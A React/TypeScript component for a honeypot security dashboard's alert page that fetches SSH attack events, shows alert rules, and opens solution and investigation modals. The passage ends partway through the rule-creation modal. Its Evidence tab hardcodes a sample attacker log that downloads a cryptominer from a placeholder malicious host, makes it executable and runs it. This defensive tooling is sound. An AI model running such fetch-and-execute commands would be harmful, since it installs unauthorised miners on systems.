import { useState, useEffect } from 'react';
import { X, Shield, Clock, MapPin, Settings, Download, Check, AlertTriangle, Eye, Archive, Lightbulb } from 'lucide-react';
import axios from 'axios';
import { motion, AnimatePresence } from 'framer-motion';

const API_BASE = 'http://localhost:5001/api';

// ============================================
// TYPESCRIPT INTERFACES
// ============================================
// These define the "shape" of our data objects so TypeScript knows what properties they have

interface Alert {
  id: string;
  title: string;
  description: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  sourceIp: string;
  country: string;
  flag: string;
  timestamp: string;
  status: 'active' | 'resolved' | 'archived';
  type: string;
  sessionId?: string;
}

interface AlertRule {
  id: string;
  name: string;
  description: string;
  enabled: boolean;
  triggerCount: number;
  condition: string;
}

// ============================================
// HELPER FUNCTIONS
// ============================================

// This function returns different color gradients based on the alert priority level
const getPriorityColor = (priority: string) => {
  switch (priority) {
    case "critical":
      return "from-red-600 to-orange-600";
    case "high":
      return "from-orange-500 to-yellow-500";
    case "medium":
      return "from-blue-500 to-cyan-500";
    default:
      return "from-green-500 to-emerald-500";
  }
};

// ============================================
// MAIN COMPONENT
// ============================================
export default function Alerts() {
  // ==================
  // STATE MANAGEMENT
  // ==================
  // useState creates variables that can change and trigger re-renders when they do
  
  const [activeFilter, setActiveFilter] = useState<'all' | 'active' | 'resolved' | 'archived'>('all');
  const [selectedAlert, setSelectedAlert] = useState<Alert | null>(null);
  const [showSolution, setShowSolution] = useState(false);
  const [showRuleConfig, setShowRuleConfig] = useState(false);
  const [alerts, setAlerts] = useState<Alert[]>([]);
  const [selectedAlerts, setSelectedAlerts] = useState<Set<string>>(new Set());
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [showAllAlerts, setShowAllAlerts] = useState(false);
  const [stats, setStats] = useState({
    active: 0,
    resolved: 0,
    avgResponseTime: '0m',
    critical: 0
  });
  const [alertRules, setAlertRules] = useState<AlertRule[]>([
    {
      id: 'rule-1',
      name: 'Multiple Failed Logins',
      description: 'Trigger when >5 failed logins from same IP',
      enabled: true,
      triggerCount: 12,
      condition: 'failed_logins > 5'
    },
    {
      id: 'rule-2',
      name: 'New Country Detected',
      description: 'Alert on connections from new countries',
      enabled: true,
      triggerCount: 8,
      condition: 'new_country == true'
    },
    {
      id: 'rule-3',
      name: 'Unusual Commands',
      description: 'Detect suspicious command patterns',
      enabled: false,
      triggerCount: 3,
      condition: 'command contains malware'
    }
  ]);

  // ==================
  // HELPER FUNCTIONS INSIDE COMPONENT
  // ==================
  
  // Converts a timestamp into "X seconds/minutes/hours/days ago" format
  const formatTimeAgo = (timestamp: string) => {
    if (!timestamp) return 'Unknown';
    const now = new Date();
    const then = new Date(timestamp);
    const seconds = Math.floor((now.getTime() - then.getTime()) / 1000);
    
    if (seconds < 60) return `${seconds} seconds ago`;
    if (seconds < 3600) return `${Math.floor(seconds / 60)} minutes ago`;
    if (seconds < 86400) return `${Math.floor(seconds / 3600)} hours ago`;
    return `${Math.floor(seconds / 86400)} days ago`;
  };

  // Fetches alerts from the backend API
  const fetchAlerts = async () => {
    try {
      setLoading(true);
      setError(null);
      
      // Make an HTTP GET request to fetch attack data
      const response = await axios.get(`${API_BASE}/dashboard/attacks`);
      
      // Transform the raw API data into Alert objects
      const convertedAlerts: Alert[] = response.data.slice(0, 50).map((attack: any, index: number) => {
        const severity = (attack.severity || 'medium') as 'critical' | 'high' | 'medium' | 'low';
        
        // Determine alert title and type based on attack type
        let title = 'SSH Connection Attempt';
        let description = 'Suspicious SSH activity detected';
        let alertType = 'connection';
        
        if (attack.type?.includes('login.failed')) {
          title = 'Persistent brute force attack';
          description = `Single IP attempting authentication with common credentials dictionary from ${attack.ip}`;
          alertType = 'brute_force';
        } else if (attack.type?.includes('login.success')) {
          title = 'Successful SSH Login';
          description = `Attacker gained access from ${attack.ip}`;
          alertType = 'successful_login';
        } else if (attack.type?.includes('command.input')) {
          title = 'Malicious Command Execution';
          description = `Command executed: ${attack.details || 'unknown'}`;
          alertType = 'command_execution';
        }
        
        return {
          id: attack.id || `alert-${index}`,
          title,
          description,
          severity,
          sourceIp: attack.ip || 'unknown',
          country: attack.country || 'Unknown',
          flag: attack.flag || '🌍',
          timestamp: formatTimeAgo(attack.timestamp),
          status: index < 5 ? 'active' : (index < 15 ? 'resolved' : 'archived'),
          type: alertType,
          sessionId: attack.sessionId
        };
      });
      
      setAlerts(convertedAlerts);
      
      // Calculate statistics
      const active = convertedAlerts.filter(a => a.status === 'active').length;
      const resolved = convertedAlerts.filter(a => a.status === 'resolved').length;
      const critical = convertedAlerts.filter(a => a.severity === 'critical').length;
      
      setStats({
        active,
        resolved,
        avgResponseTime: '8m',
        critical
      });
      
    } catch (error: any) {
      console.error('Error fetching alerts:', error);
      setError(error.message || 'Failed to fetch alerts');
    } finally {
      setLoading(false);
    }
  };

  // Toggle an alert rule on/off
  const toggleRule = (ruleId: string) => {
    setAlertRules(alertRules.map(rule => 
      rule.id === ruleId ? { ...rule, enabled: !rule.enabled } : rule
    ));
  };

  // Toggle individual alert selection for bulk actions
  const toggleAlertSelection = (alertId: string) => {
    const newSelected = new Set(selectedAlerts);
    if (newSelected.has(alertId)) {
      newSelected.delete(alertId);
    } else {
      newSelected.add(alertId);
    }
    setSelectedAlerts(newSelected);
  };

  // Mark multiple alerts as resolved
  const bulkMarkAsResolved = () => {
    setAlerts(alerts.map(a => 
      selectedAlerts.has(a.id) ? { ...a, status: 'resolved' as const } : a
    ));
    setSelectedAlerts(new Set());
    
    // Update stats
    const active = alerts.filter(a => 
      selectedAlerts.has(a.id) ? false : a.status === 'active'
    ).length;
    const resolved = alerts.filter(a => 
      selectedAlerts.has(a.id) || a.status === 'resolved'
    ).length;
    setStats(prev => ({ ...prev, active, resolved }));
  };

  // Archive multiple alerts
  const bulkArchive = () => {
    setAlerts(alerts.map(a => 
      selectedAlerts.has(a.id) ? { ...a, status: 'archived' as const } : a
    ));
    setSelectedAlerts(new Set());
  };

  // Export selected alerts as JSON file
  const exportSelectedAlerts = () => {
    const selected = alerts.filter(a => selectedAlerts.has(a.id));
    const blob = new Blob([JSON.stringify(selected, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `alerts-export-${new Date().toISOString()}.json`;
    a.click();
    URL.revokeObjectURL(url); // Clean up
  };

  // Export all alert rules as JSON file
  const exportRules = () => {
    const blob = new Blob([JSON.stringify(alertRules, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `alert-rules-${new Date().toISOString()}.json`;
    a.click();
    URL.revokeObjectURL(url); // Clean up
  };

  // ==================
  // EFFECTS
  // ==================
  // useEffect runs code when the component mounts and on specified dependencies
  
  useEffect(() => {
    fetchAlerts(); // Fetch alerts when component first loads
    const interval = setInterval(fetchAlerts, 30000); // Refresh every 30 seconds
    return () => clearInterval(interval); // Cleanup: stop the interval when component unmounts
  }, []);

  // ==================
  // COMPUTED VALUES
  // ==================
  
  // Filter alerts based on the active filter (all/active/resolved/archived)
  const filteredAlerts = activeFilter === 'all' 
    ? alerts 
    : alerts.filter(a => a.status === activeFilter);

  // Show only 3 alerts initially unless "Show More" is clicked
  const displayedAlerts = showAllAlerts ? filteredAlerts : filteredAlerts.slice(0, 3);

  // ==================
  // LOADING STATE
  // ==================
  
  if (loading && alerts.length === 0) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-4 border-[#00D9FF] border-t-transparent mx-auto mb-4"></div>
          <p className="text-gray-600">Loading alerts...</p>
        </div>
      </div>
    );
  }

  // ==================
  // MAIN RENDER
  // ==================
  
  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black">
      <div className="p-6">
        {/* Header Section */}
        <div className="flex items-center justify-between mb-6">
          <div>
            <h1 className="text-3xl text-white mb-2">Alert Management Center</h1>
            <p className="text-gray-400">Monitor and respond to security alerts</p>
          </div>
          
          <button 
            onClick={() => setShowRuleConfig(true)}
            className="px-6 py-3 bg-gradient-to-r from-[#00D9FF] to-[#8B5CF6] text-white rounded-lg hover:shadow-lg hover:shadow-[#00D9FF]/30 transition-all shadow-md"
          >
            Create Alert Rule
          </button>
        </div>

        {/* Error Display */}
        {error && (
          <div className="bg-red-900/40 border border-red-700 rounded-xl p-4 flex items-center gap-3 mb-6">
            <AlertTriangle className="w-5 h-5 text-red-400" />
            <div>
              <div className="font-bold text-red-400">Error Loading Alerts</div>
              <div className="text-red-300 text-sm">{error}</div>
            </div>
            <button 
              onClick={fetchAlerts} 
              className="ml-auto px-3 py-1 bg-red-800/60 text-red-300 rounded-lg hover:bg-red-800"
            >
              Retry
            </button>
          </div>
        )}

        {/* Bulk Actions Toolbar - Shows when alerts are selected */}
        {selectedAlerts.size > 0 && (
          <div className="bg-gradient-to-r from-blue-50 to-purple-50 border border-[#00D9FF] rounded-xl p-4 flex items-center justify-between shadow-md">
            <span className="font-bold text-gray-900 flex items-center gap-2">
              <Check className="w-5 h-5 text-[#00D9FF]" />
              {selectedAlerts.size} alert{selectedAlerts.size > 1 ? 's' : ''} selected
            </span>
            <div className="flex gap-2">
              <button 
                onClick={bulkMarkAsResolved} 
                className="px-4 py-2 bg-green-500 text-white rounded-lg hover:bg-green-600 transition flex items-center gap-2 shadow-md"
              >
                <Check className="w-4 h-4" />
                Mark Resolved
              </button>
              <button 
                onClick={bulkArchive} 
                className="px-4 py-2 bg-gray-700 text-white rounded-lg hover:bg-gray-800 transition flex items-center gap-2 shadow-md"
              >
                <Archive className="w-4 h-4" />
                Archive
              </button>
              <button 
                onClick={exportSelectedAlerts} 
                className="px-4 py-2 bg-[#00D9FF] text-white rounded-lg hover:bg-[#00D9FF]/80 transition flex items-center gap-2 shadow-md"
              >
                <Download className="w-4 h-4" />
                Export
              </button>
              <button 
                onClick={() => setSelectedAlerts(new Set())} 
                className="px-4 py-2 bg-red-500 text-white rounded-lg hover:bg-red-600 transition flex items-center gap-2 shadow-md"
              >
                <X className="w-4 h-4" />
                Clear
              </button>
            </div>
          </div>
        )}

        {/* Alert Statistics Cards */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-6">
          {[
            { label: "Active Alerts", value: stats.active.toString(), color: "from-[#FF6B35] to-[#8B5CF6]" },
            { label: "Resolved Today", value: stats.resolved.toString(), color: "from-[#10B981] to-[#00D9FF]" },
            { label: "Avg Response Time", value: stats.avgResponseTime, color: "from-[#00D9FF] to-[#8B5CF6]" },
            { label: "Critical Alerts", value: stats.critical.toString(), color: "from-[#FF6B35] to-[#FFA500]" },
          ].map((stat, index) => (
            <div
              key={index}
              className="bg-gray-800/90 border border-gray-700 rounded-xl p-5 shadow-sm hover:shadow-lg hover:shadow-[#00D9FF]/20 transition-all"
            >
              <p className="text-gray-400 text-sm mb-2">{stat.label}</p>
              <div className="flex items-center gap-3">
                <p className="text-white text-3xl">{stat.value}</p>
                <div className={`w-12 h-12 rounded-lg bg-gradient-to-br ${stat.color} opacity-20`} />
              </div>
            </div>
          ))}
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {/* Alert Feed Section */}
          <div className="lg:col-span-2">
            <div className="bg-gray-800/90 border border-gray-700 rounded-xl p-5 shadow-sm">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-white text-lg">Alert Feed ({filteredAlerts.length})</h2>
                <div className="flex gap-2">
                  {(['all', 'active', 'resolved', 'archived'] as const).map((filter) => (
                    <button
                      key={filter}
                      onClick={() => {
                        setActiveFilter(filter);
                        setShowAllAlerts(false);
                      }}
                      className={`px-3 py-1 rounded text-xs transition-all ${
                        activeFilter === filter
                          ? "bg-[#00D9FF] text-white shadow-md shadow-[#00D9FF]/30"
                          : "bg-gray-700 text-gray-300 hover:bg-gray-600"
                      }`}
                    >
                      {filter.charAt(0).toUpperCase() + filter.slice(1)}
                    </button>
                  ))}
                </div>
              </div>

              {/* Alert List */}
              <div className="space-y-3">
                {displayedAlerts.length === 0 ? (
                  <div className="p-12 text-center text-gray-400">
                    <Shield className="w-16 h-16 mx-auto mb-4 text-gray-600" />
                    <p className="text-lg font-bold mb-2">No alerts to display</p>
                    <p className="text-sm">All systems operational</p>
                  </div>
                ) : (
                  displayedAlerts.map((alert) => (
                    <div
                      key={alert.id}
                      className="bg-gray-900/60 rounded-lg border border-gray-700 p-4 hover:border-[#00D9FF] hover:shadow-lg hover:shadow-[#00D9FF]/20 transition-all"
                    >
                      <div className="flex items-start gap-3 mb-3">
                        {/* Checkbox for bulk selection */}
                        <input
                          type="checkbox"
                          checked={selectedAlerts.has(alert.id)}
                          onChange={() => toggleAlertSelection(alert.id)}
                          className="mt-1 w-5 h-5 rounded border-gray-600 bg-gray-800 text-[#00D9FF] focus:ring-[#00D9FF] focus:ring-offset-gray-900 cursor-pointer"
                        />
                        
                        <div className={`px-3 py-1 rounded-lg bg-gradient-to-r ${getPriorityColor(alert.severity)} text-white shadow-md`}>
                          {alert.severity.charAt(0).toUpperCase() + alert.severity.slice(1)}
                        </div>
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center justify-between mb-1">
                            <h3 className="text-white">{alert.title}</h3>
                            <span className="text-gray-500 text-xs">{alert.timestamp}</span>
                          </div>
                          <p className="text-gray-400 text-sm mb-2">{alert.description}</p>
                          <div className="flex items-center gap-4 text-xs">
                            <span className="text-gray-400">
                              Type: <span className="text-[#00D9FF]">{alert.type}</span>
                            </span>
                            <span className="text-gray-400">
                              Triggered by: <span className="text-[#00D9FF] font-mono">{alert.sourceIp}</span>
                            </span>
                            <span className={`px-2 py-0.5 rounded ${
                              alert.status === 'active'
                                ? "bg-red-900/40 text-red-400 border border-red-700"
                                : alert.status === 'resolved'
                                ? "bg-green-900/40 text-green-400 border border-green-700"
                                : "bg-yellow-900/40 text-yellow-400 border border-yellow-700"
                            }`}>
                              {alert.status.charAt(0).toUpperCase() + alert.status.slice(1)}
                            </span>
                          </div>
                        </div>
                      </div>

                      {/* Action Buttons */}
                      <div className="flex gap-2 pt-3 border-t border-gray-700">
                        <button
                          onClick={() => setShowSolution(true)}
                          className="flex items-center gap-1 px-3 py-1.5 bg-gradient-to-r from-[#00D9FF] to-[#8B5CF6] text-white rounded text-xs hover:shadow-lg hover:shadow-[#00D9FF]/30 transition-all"
                        >
                          <Lightbulb className="w-3 h-3" />
                          View Solution
                        </button>
                        <button 
                          onClick={() => setSelectedAlert(alert)}
                          className="flex items-center gap-1 px-3 py-1.5 bg-[#00D9FF]/20 text-[#00D9FF] border border-[#00D9FF] rounded text-xs hover:bg-[#00D9FF]/30 transition-colors"
                        >
                          <Eye className="w-3 h-3" />
                          Investigate
                        </button>
                        <button className="flex items-center gap-1 px-3 py-1.5 bg-green-900/40 text-green-400 border border-green-700 rounded text-xs hover:bg-green-900/60 transition-colors">
                          <Check className="w-3 h-3" />
                          Mark Resolved
                        </button>
                        <button className="flex items-center gap-1 px-3 py-1.5 bg-gray-700 text-gray-300 rounded text-xs hover:bg-gray-600 transition-colors">
                          <Archive className="w-3 h-3" />
                          Archive
                        </button>
                      </div>
                    </div>
                  ))
                )}
              </div>

              {/* Show More / Show Less Button */}
              {filteredAlerts.length > 3 && (
                <div className="mt-4">
                  <button
                    onClick={() => setShowAllAlerts(!showAllAlerts)}
                    className="w-full px-4 py-2 bg-gray-700 text-gray-300 rounded-lg hover:bg-gray-600 transition-colors"
                  >
                    {showAllAlerts ? 'Show Less' : `Show More (${filteredAlerts.length - 3} more)`}
                  </button>
                </div>
              )}
            </div>
          </div>

          {/* Alert Configuration Sidebar */}
          <div className="space-y-6">
            {/* Alert Rules Panel */}
            <div className="bg-gray-800/90 border border-gray-700 rounded-xl p-5 shadow-sm">
              <div className="flex items-center justify-between mb-4">
                <h3 className="text-white text-lg">Alert Rules</h3>
                <button
                  onClick={exportRules}
                  className="px-3 py-1.5 bg-gray-700 text-gray-300 rounded-lg hover:bg-gray-600 transition flex items-center gap-1.5 text-xs"
                  title="Export all rules"
                >
                  <Download className="w-3 h-3" />
                  Export
                </button>
              </div>
              <div className="space-y-3">
                {alertRules.map((rule) => (
                  <div
                    key={rule.id}
                    className="p-3 bg-gray-900/60 rounded-lg border border-gray-700"
                  >
                    <div className="flex items-center justify-between mb-2">
                      <span className="text-white text-sm">{rule.name}</span>
                      <label className="relative inline-block w-10 h-5">
                        <input 
                          type="checkbox" 
                          checked={rule.enabled}
                          onChange={() => toggleRule(rule.id)}
                          className="opacity-0 w-0 h-0 peer" 
                        />
                        <span className="absolute inset-0 bg-gray-600 rounded-full cursor-pointer transition-colors peer-checked:bg-[#00D9FF]" />
                        <span className="absolute left-1 top-1 w-3 h-3 bg-white rounded-full transition-transform peer-checked:translate-x-5 shadow-md" />
                      </label>
                    </div>
                    <span className="text-gray-500 text-xs">Triggered {rule.triggerCount}x today</span>
                  </div>
                ))}
              </div>
            </div>

            {/* Quick Create Panel */}
            <div className="bg-gray-800/90 border border-gray-700 rounded-xl p-5 shadow-sm">
              <h3 className="text-white text-lg mb-4">Quick Create</h3>
              <div className="space-y-2">
                {["Multiple failed logins", "New country detected", "Unusual commands"].map((template) => (
                  <button
                    key={template}
                    className="w-full px-3 py-2 bg-[#00D9FF]/20 text-[#00D9FF] text-sm rounded-lg hover:bg-[#00D9FF]/30 border border-[#00D9FF]/50 transition-colors text-left"
                  >
                    {template}
                  </button>
                ))}
              </div>
            </div>
          </div>
        </div>

        {/* Modals */}
        <AnimatePresence>
          {showSolution && (
            <SolutionModal onClose={() => setShowSolution(false)} />
          )}
        </AnimatePresence>

        <AnimatePresence>
          {selectedAlert && (
            <InvestigationModal alert={selectedAlert} onClose={() => setSelectedAlert(null)} />
          )}
        </AnimatePresence>

        <AnimatePresence>
          {showRuleConfig && (
            <RuleConfigModal onClose={() => setShowRuleConfig(false)} />
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}

// ============================================
// SOLUTION MODAL COMPONENT
// ============================================
// This modal displays recommended solutions for handling security alerts

function SolutionModal({ onClose }: { onClose: () => void }) {
  const solutionSteps = [
    "Block IP address at firewall level immediately",
    "Update IDS/IPS signatures to detect patterns",
    "Review honeypot logs for indicators",
    "Report IPs to threat intelligence feeds",
    "Implement rate limiting on SSH authentication"
  ];

  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4"
      onClick={onClose}
    >
      <motion.div
        initial={{ scale: 0.9, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        exit={{ scale: 0.9, opacity: 0 }}
        className="bg-white rounded-2xl shadow-2xl max-w-2xl w-full max-h-[80vh] overflow-hidden"
        onClick={(e) => e.stopPropagation()}
      >
        <div className="p-6 border-b border-gray-200 flex items-start justify-between">
          <div>
            <div className="flex items-center gap-2 mb-2">
              <Lightbulb className="w-6 h-6 text-[#00D9FF]" />
              <h2 className="text-2xl text-gray-900">Solution & Mitigation</h2>
            </div>
            <p className="text-gray-600">Recommended security actions</p>
          </div>
          <button
            onClick={onClose}
            className="p-2 hover:bg-gray-100 rounded-lg transition-colors"
          >
            <X className="w-5 h-5 text-gray-500" />
          </button>
        </div>

        <div className="p-6 overflow-y-auto max-h-[calc(80vh-180px)]">
          <div className="mb-6">
            <h3 className="text-lg text-gray-900 mb-3">Immediate Action Steps</h3>
            <div className="space-y-2">
              {solutionSteps.map((step, index) => (
                <div key={index} className="flex gap-3 p-3 bg-blue-50 rounded-lg border border-blue-200">
                  <div className="flex-shrink-0 w-6 h-6 bg-[#00D9FF] text-white rounded-full flex items-center justify-center text-sm">
                    {index + 1}
                  </div>
                  <p className="text-gray-700 text-sm">{step}</p>
                </div>
              ))}
            </div>
          </div>

          <div className="p-4 bg-gradient-to-r from-green-50 to-blue-50 rounded-lg border border-green-200">
            <h3 className="text-lg text-gray-900 mb-2 flex items-center gap-2">
              <Shield className="w-5 h-5 text-green-600" />
              Prevention Strategy
            </h3>
            <p className="text-gray-700">Implement application whitelisting, use strong password policies and 2FA, deploy fail2ban or intrusion prevention, and monitor honeypot logs regularly.</p>
          </div>
        </div>

        <div className="p-6 border-t border-gray-200 flex gap-3">
          <button
            onClick={onClose}
            className="flex-1 px-4 py-3 bg-gradient-to-r from-[#00D9FF] to-[#8B5CF6] text-white rounded-lg hover:shadow-lg transition-all"
          >
            Got It, Thanks!
          </button>
          <button className="px-4 py-3 bg-gray-100 text-gray-700 rounded-lg hover:bg-gray-200 transition-colors">
            Print Guide
          </button>
        </div>
      </motion.div>
    </motion.div>
  );
}

// ============================================
// INVESTIGATION MODAL COMPONENT
// ============================================
// This modal shows detailed information about a specific alert for investigation

function InvestigationModal({ alert, onClose }: { alert: Alert; onClose: () => void }) {
  const [activeTab, setActiveTab] = useState<"overview" | "timeline" | "evidence" | "notes">("overview");
  const [notes, setNotes] = useState('');
  const [sessionDetails, setSessionDetails] = useState<any>(null);
  const [loading, setLoading] = useState(false);

  // Fetch session details when modal opens (if sessionId exists)
  useEffect(() => {
    if (alert.sessionId) {
      setLoading(true);
      axios.get(`${API_BASE}/sessions/${alert.sessionId}/details`)
        .then(res => setSessionDetails(res.data))
        .catch(err => console.error('Error fetching session details:', err))
        .finally(() => setLoading(false));
    }
  }, [alert.sessionId]);

  // Export all alert information as a JSON file
  const exportAlertPackage = () => {
    const packageData = {
      alert,
      sessionDetails,
      notes,
      exportedAt: new Date().toISOString()
    };
    const blob = new Blob([JSON.stringify(packageData, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `alert-package-${alert.id}.json`;
    a.click();
  };

  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4"
      onClick={onClose}
    >
      <motion.div
        initial={{ scale: 0.9, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        exit={{ scale: 0.9, opacity: 0 }}
        className="bg-white rounded-2xl shadow-2xl max-w-4xl w-full max-h-[85vh] overflow-hidden"
        onClick={(e) => e.stopPropagation()}
      >
        <div className="p-6 border-b border-gray-200 flex items-start justify-between bg-gradient-to-r from-blue-50 to-purple-50">
          <div>
            <div className="flex items-center gap-2 mb-2">
              <Eye className="w-6 h-6 text-[#00D9FF]" />
              <h2 className="text-2xl text-gray-900">Investigation Dashboard</h2>
            </div>
            <p className="text-gray-600">{alert.title}</p>
          </div>
          <button
            onClick={onClose}
            className="p-2 hover:bg-white rounded-lg transition-colors"
          >
            <X className="w-5 h-5 text-gray-500" />
          </button>
        </div>

        {/* Tabs */}
        <div className="flex gap-2 px-6 border-b border-gray-200">
          {[
            { id: "overview", label: "Overview" },
            { id: "timeline", label: "Timeline" },
            { id: "evidence", label: "Evidence" },
            { id: "notes", label: "Notes" },
          ].map((tab) => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as any)}
              className={`px-4 py-3 text-sm transition-colors ${
                activeTab === tab.id
                  ? "text-[#00D9FF] border-b-2 border-[#00D9FF]"
                  : "text-gray-600 hover:text-[#00D9FF]"
              }`}
            >
              {tab.label}
            </button>
          ))}
        </div>

        {/* Tab Content */}
        <div className="p-6 overflow-y-auto max-h-[calc(85vh-240px)]">
          {activeTab === "overview" && (
            <div className="space-y-4">
              <div className="grid grid-cols-2 gap-4">
                <div className="p-4 bg-red-50 rounded-lg border border-red-200">
                  <p className="text-sm text-gray-600 mb-1">Priority</p>
                  <p className="text-xl text-red-600">{alert.severity.charAt(0).toUpperCase() + alert.severity.slice(1)}</p>
                </div>
                <div className="p-4 bg-blue-50 rounded-lg border border-blue-200">
                  <p className="text-sm text-gray-600 mb-1">Attack Type</p>
                  <p className="text-xl text-blue-600">{alert.type}</p>
                </div>
                <div className="p-4 bg-purple-50 rounded-lg border border-purple-200">
                  <p className="text-sm text-gray-600 mb-1">Source IP</p>
                  <p className="text-xl text-purple-600 font-mono">{alert.sourceIp}</p>
                </div>
                <div className="p-4 bg-green-50 rounded-lg border border-green-200">
                  <p className="text-sm text-gray-600 mb-1">Status</p>
                  <p className="text-xl text-green-600">{alert.status.charAt(0).toUpperCase() + alert.status.slice(1)}</p>
                </div>
              </div>

              <div className="p-4 bg-gray-50 rounded-lg border border-gray-200">
                <h3 className="text-gray-900 mb-2">Description</h3>
                <p className="text-gray-700">{alert.description}</p>
              </div>

              {sessionDetails && (
                <div className="p-4 bg-blue-50 rounded-lg border border-blue-200">
                  <h3 className="text-gray-900 mb-2">Session Information</h3>
                  <div className="grid grid-cols-2 gap-2 text-sm">
                    <div>Commands: <span className="font-bold">{sessionDetails.commands?.length || 0}</span></div>
                    <div>Duration: <span className="font-bold">{sessionDetails.behaviorProfile?.sessionDuration || 0}s</span></div>
                  </div>
                </div>
              )}

              <div className="p-4 bg-orange-50 rounded-lg border border-orange-200">
                <h3 className="text-gray-900 mb-2">Risk Assessment</h3>
                <div className="space-y-2">
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-600">Threat Level:</span>
                    <span className="text-orange-600">High</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-600">Confidence:</span>
                    <span className="text-orange-600">95%</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span className="text-gray-600">Impact:</span>
                    <span className="text-orange-600">System Compromise</span>
                  </div>
                </div>
              </div>
            </div>
          )}

          {activeTab === "timeline" && (
            <div className="space-y-3">
              {[
                { time: "14:23:45", event: "Initial connection detected", severity: "info" },
                { time: "14:23:47", event: "Authentication attempt", severity: "warning" },
                { time: "14:23:52", event: "Malicious payload downloaded", severity: "critical" },
                { time: "14:24:01", event: "Execution attempt blocked", severity: "success" },
                { time: "14:24:05", event: "Connection terminated", severity: "info" },
              ].map((item, i) => (
                <div key={i} className="flex gap-4 p-3 bg-gray-50 rounded-lg border border-gray-200">
                  <div className="text-sm text-gray-500 font-mono">{item.time}</div>
                  <div className="flex-1">
                    <p className="text-gray-900">{item.event}</p>
                  </div>
                  <span className={`px-2 py-1 rounded text-xs ${
                    item.severity === "critical" ? "bg-red-100 text-red-700" :
                    item.severity === "warning" ? "bg-orange-100 text-orange-700" :
                    item.severity === "success" ? "bg-green-100 text-green-700" :
                    "bg-blue-100 text-blue-700"
                  }`}>
                    {item.severity}
                  </span>
                </div>
              ))}
            </div>
          )}

          {activeTab === "evidence" && (
            <div className="space-y-4">
              <div className="p-4 bg-gray-900 rounded-lg">
                <h3 className="text-white mb-2">Command Log</h3>
                <div className="font-mono text-sm text-green-400 space-y-1">
                  <div>$ wget http://malicious.com/xmrig</div>
                  <div>$ chmod +x xmrig</div>
                  <div>$ ./xmrig --donate-level 1</div>
                </div>
              </div>

              <div className="p-4 bg-blue-50 rounded-lg border border-blue-200">
                <h3 className="text-gray-900 mb-2">Network Indicators</h3>
                <div className="space-y-2 text-sm">
                  <div className="flex justify-between">
                    <span className="text-gray-600">Destination:</span>
                    <span className="text-gray-900 font-mono">malicious.com</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-600">Protocol:</span>
                    <span className="text-gray-900">HTTP</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-600">Port:</span>
                    <span className="text-gray-900">80</span>
                  </div>
                </div>
              </div>
            </div>
          )}

          {activeTab === "notes" && (
            <div>
              <textarea
                value={notes}
                onChange={(e) => setNotes(e.target.value)}
                placeholder="Add investigation notes here..."
                className="w-full h-64 p-4 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#00D9FF] focus:border-transparent"
              />
            </div>
          )}
        </div>

        {/* Footer Actions */}
        <div className="p-6 border-t border-gray-200 flex gap-3">
          <button
            onClick={exportAlertPackage}
            className="flex items-center gap-2 px-4 py-3 bg-gradient-to-r from-[#00D9FF] to-[#8B5CF6] text-white rounded-lg hover:shadow-lg transition-all"
          >
            <Download className="w-4 h-4" />
            Export Package
          </button>
          <button className="px-4 py-3 bg-red-50 text-red-600 border border-red-200 rounded-lg hover:bg-red-100 transition-colors">
            Block IP
          </button>
          <button 
            onClick={onClose}
            className="px-4 py-3 bg-gray-100 text-gray-700 rounded-lg hover:bg-gray-200 transition-colors"
          >
            Close
          </button>
        </div>
      </motion.div>
    </motion.div>
  );
}

// ============================================
// RULE CONFIG MODAL COMPONENT
// ============================================
// This modal allows users to create new alert rules with full configuration

function RuleConfigModal({ onClose }: { onClose: () => void }) {
  // State for the form fields
  const [ruleName, setRuleName] = useState('');
  const [ruleDescription, setRuleDescription] = useState('');
  const [ruleCondition, setRuleCondition] = useState('');
  const [ruleType, setRuleType] = useState('brute_force');
  const [ruleSeverity, setRuleSeverity] = useState('medium');
  const [emailNotif, setEmailNotif] = useState(true);
  const [slackNotif, setSlackNotif] = useState(false);
  const [webhookNotif, setWebhookNotif] = useState(false);

  // Handle rule creation
  const handleCreateRule = () => {
    // Validation: check if required fields are filled
    if (!ruleName || !ruleDescription) {
      alert('Please fill in all required fields (Name and Description)');
      return;
    }
    
    // Create the rule object
    const newRule = {
      name: ruleName,
      description: ruleDescription,
      condition: ruleCondition,
      type: ruleType,
      severity: ruleSeverity,
      notifications: {
        email: emailNotif,
        slack: slackNotif,
        webhook: webhookNotif
      }
    };
    
    console.log('Creating rule:', newRule);
    alert('Rule created successfully! (In production, this would save to the backend)');
    onClose();
  };

  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4"
      onClick={onClose}
    >
      <motion.div
